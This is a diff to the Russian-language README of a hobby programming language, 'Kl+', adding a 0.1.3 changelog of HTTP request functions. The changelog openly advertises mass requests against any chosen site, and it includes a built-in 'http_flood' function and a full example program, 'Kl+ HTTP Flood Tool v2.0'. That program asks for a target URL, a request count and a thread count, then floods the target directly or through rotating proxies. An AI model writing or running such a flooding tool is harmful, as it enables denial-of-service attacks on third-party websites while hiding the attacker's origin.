@@ -2,7 +2,7 @@
 
 **Kl+** — современный компилируемый язык программирования, сочетающий низкоуровневый контроль C/C++ с выразительностью высокоуровневых языков.
 
-- **Версия:** 0.1.0
+- **Версия:** 0.1.3
 - **Платформы:** Windows.
 
 ---
@@ -822,6 +822,201 @@ fn main() {
     println("Game Over! Score: %d", player.score);
 }
 ```
+changelog 0.1.3
+
+Добавлены новые возможности и функции!
+например теперь вы можете отправлять url запросы на необходимый вам сайт! и для отправки массовых запросов это тоже подойдет.
+вот вам пример кода для отправки множество запросов на вам нужный сайт с потоками!
+новый синтаксис и пример **ниже**:
+
+## 13. HTTP/HTTPS функции
+
+### GET запросы
+
+| Функция | Описание | Возвращает |
+|---------|----------|------------|
+| `http_get(url)` | HTTP GET запрос | `str` — тело ответа |
+| `https_get(url)` | HTTPS GET запрос | `str` — тело ответа |
+| `http_get_status(url)` | HTTP статус код | `i32` — код (200, 404...) |
+| `https_get_status(url)` | HTTPS статус код | `i32` — код (200, 404...) |
+
+---
+
+### POST запросы
+
+| Функция | Описание | Возвращает |
+|---------|----------|------------|
+| `http_post(url, data)` | HTTP POST запрос | `str` — тело ответа |
+| `https_post(url, data)` | HTTPS POST запрос | `str` — тело ответа |
+
+---
+
+### Прокси
+
+| Функция | Описание | Возвращает |
+|---------|----------|------------|
+| `https_get_proxy(url, proxy)` | HTTPS GET через прокси | `str` — тело ответа |
+| `https_post_proxy(url, data, proxy)` | HTTPS POST через прокси | `str` — тело ответа |
+| `https_get_status_proxy(url, proxy)` | HTTPS статус через прокси | `i32` — код |
+
+**Формат прокси:**
+- `"http://ip:port"`
+- `"ip:port"`
+
+---
+
+### Скачивание файлов
+
+| Функция | Описание | Возвращает |
+|---------|----------|------------|
+| `http_download(url, filename)` | Скачать файл | `i32` — 0 = OK, -1 = ошибка |
+
+---
+
+### Многопоточные запросы
+
+| Функция | Описание | Возвращает |
+|---------|----------|------------|
+| `http_flood(url, count, threads)` | Параллельные GET запросы | `i32` — количество успешных |
+
+---
+
+### Управление памятью
+
+| Функция | Описание |
+|---------|----------|
+| `http_free(response)` | Освободить память ответа |
+
+пример:
+```
+fn main() {
+    println("================================");
+    println("   Kl+ HTTP Flood Tool v2.0");
+    println("================================");
+    println("");
+    
+    // Ввод URL
+    print("Enter target URL: ");
+    let url: str = input();
+    
+    // Ввод количества
+    print("How many requests? ");
+    let count: i32 = input_int();
+    
+    // Ввод потоков
+    print("Threads (1-64): ");
+    let threads: i32 = input_int();
+    
+    // Выбор режима
+    println("");
+    println("Mode:");
+    println("  1 - No proxy (direct)");
+    println("  2 - With proxies");
+    print("Choose (1-2): ");
+    let mode: i32 = input_int();
+    
+    println("");
+    
+    if mode == 1 {
+        // Без прокси — многопоточный flood
+        println("Starting %d requests with %d threads...", count, threads);
+        println("");
+        
+        let success: i32 = http_flood(url, count, threads);
+        
+        println("");
+        println("================================");
+        println("  Results:");
+        println("  Total:   %d", count);
+        println("  Success: %d", success);
+        println("  Failed:  %d", count - success);
+        println("================================");
+    } elif mode == 2 {
+        // С прокси — ручной ввод
+        println("Enter proxies (format: ip:port)");
+        println("Enter empty line to stop");
+        println("");
+        
+        // Храним до 20 прокси
+        let mut p1: str = "";
+        let mut p2: str = "";
+        let mut p3: str = "";
+        let mut p4: str = "";
+        let mut p5: str = "";
+        let mut proxy_count: i32 = 0;
+        
+        print("Proxy 1: ");
+        p1 = input();
+        if strlen(p1) > 3 { proxy_count = 1; }
+        
+        if proxy_count >= 1 {
+            print("Proxy 2 (or empty): ");
+            p2 = input();
+            if strlen(p2) > 3 { proxy_count = 2; }
+        }
+        
+        if proxy_count >= 2 {
+            print("Proxy 3 (or empty): ");
+            p3 = input();
+            if strlen(p3) > 3 { proxy_count = 3; }
+        }
+        
+        if proxy_count >= 3 {
+            print("Proxy 4 (or empty): ");
+            p4 = input();
+            if strlen(p4) > 3 { proxy_count = 4; }
+        }
+        
+        if proxy_count >= 4 {
+            print("Proxy 5 (or empty): ");
+            p5 = input();
+            if strlen(p5) > 3 { proxy_count = 5; }
+        }
+        
+        println("");
+        println("Using %d proxies", proxy_count);
+        println("Starting %d requests with %d threads...", count, threads);
+        println("");
+        
+        // Отправляем запросы с ротацией прокси
+        let mut success: i32 = 0;
+        let mut fail: i32 = 0;
+        
+        for i in 1..=count {
+            let mut current_proxy: str = p1;
+            let proxy_idx: i32 = (i - 1) % proxy_count;
+            
+            if proxy_idx == 0 { current_proxy = p1; }
+            elif proxy_idx == 1 { current_proxy = p2; }
+            elif proxy_idx == 2 { current_proxy = p3; }
+            elif proxy_idx == 3 { current_proxy = p4; }
+            elif proxy_idx == 4 { current_proxy = p5; }
+            
+            let status: i32 = https_get_status_proxy(url, current_proxy);
+            
+            if status >= 200 && status < 400 {
+                success += 1;
+                println("  [%d/%d] Proxy: %s -> %d OK", i, count, current_proxy, status);
+            } else {
+                fail += 1;
+                println("  [%d/%d] Proxy: %s -> %d FAIL", i, count, current_proxy, status);
+            }
+        }
+        
+        println("");
+        println("================================");
+        println("  Results:");
+        println("  Total:   %d", count);
+        println("  Success: %d", success);
+        println("  Failed:  %d", fail);
+        println("  Proxies: %d", proxy_count);
+        println("================================");
+    } else {
+        println("Invalid mode!");
+    }
+}
+```
+
 ```
 скачать последнюю версию языка можно в Releases(.exe)
 ```
